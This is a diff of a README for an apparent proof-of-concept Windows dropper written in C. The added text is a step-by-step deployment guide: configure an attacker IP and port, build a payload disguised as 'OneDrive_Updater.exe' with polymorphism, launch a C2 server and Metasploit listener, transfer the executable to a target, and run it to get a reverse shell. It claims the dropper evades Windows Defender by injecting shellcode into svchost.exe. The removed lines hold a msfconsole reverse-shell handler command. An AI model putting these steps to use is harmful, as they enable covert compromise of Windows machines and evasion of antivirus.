@@ -67,21 +67,44 @@ This project is a **Proof of Concept (PoC)** of a modular dropper written in C, 
 
 ---
 
-## 🔨 Compilation and Weaponization
+## 🔨 Configuration and Deployment
 
-The project requires the `mingw-w64` cross-compiler on Linux.
+The project requires the `mingw-w64` cross-compiler on Linux. 
 
+**⚠️ Configuration Requirement:** Before building, you must update the Attacker IP and Port in the following two files to match your local setup:
+1. `src/config.h` (C2 URL for the dropper)
+2. `attacker/start_c2.sh` (LHOST and LPORT for payload generation and listener)
+
+> **Ethical Note:** For testing and educational purposes, the project currently relies on a default hardcoded XOR key provided in `config.h`. Full instructions for generating and implementing custom encryption keys are intentionally omitted from this PoC.
+
+### Deployment Steps
+
+**1. Compile and Weaponize**
+Run the automated builder to compile the C code, strip metadata, and apply polymorphism. 
+```bash
+# Basic build with a custom name
+python3 tools/builder.py --name "OneDrive_Updater.exe"
+
+# Build in debug mode (shows terminal and verbose logging)
+python3 tools/builder.py --debug
 ```
-# Code not yet available
+The generated payload will be saved in the `build/` directory.
+
+**2. Launch C2 Infrastructure**
+Start the automated script to generate the raw shellcode, host it via a background Python web server, and launch the Metasploit listener.
+```bash
+chmod +x ./attacker/start_c2.sh
+./attacker/start_c2.sh
 ```
+
+**3. Transfer the Payload**
+Transfer the generated executable from your `build/` folder to the target Windows machine (e.g., by hosting it on a web server or transferring it via USB for lab testing).
+
+**4. Execute**
+Run the dropper on the target machine. Once the sandbox checks and smart delays are bypassed, the payload will be downloaded and injected, returning a reverse shell/beacon to your active Metasploit handler.
 
 ---
 
-## 🔬 Laboratory Testing
+## 🔬 Testing
 
 The implant was successfully tested on **Windows 11 (23H2)**, bypassing standard Windows Defender signatures for loading Meterpreter (HTTP) shellcode injected into suspended `svchost.exe` processes.
-
-```
-# Example of Metasploit listener on Kali
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <attacker_ip>; set LPORT <attacker_port>; exploit"
-```
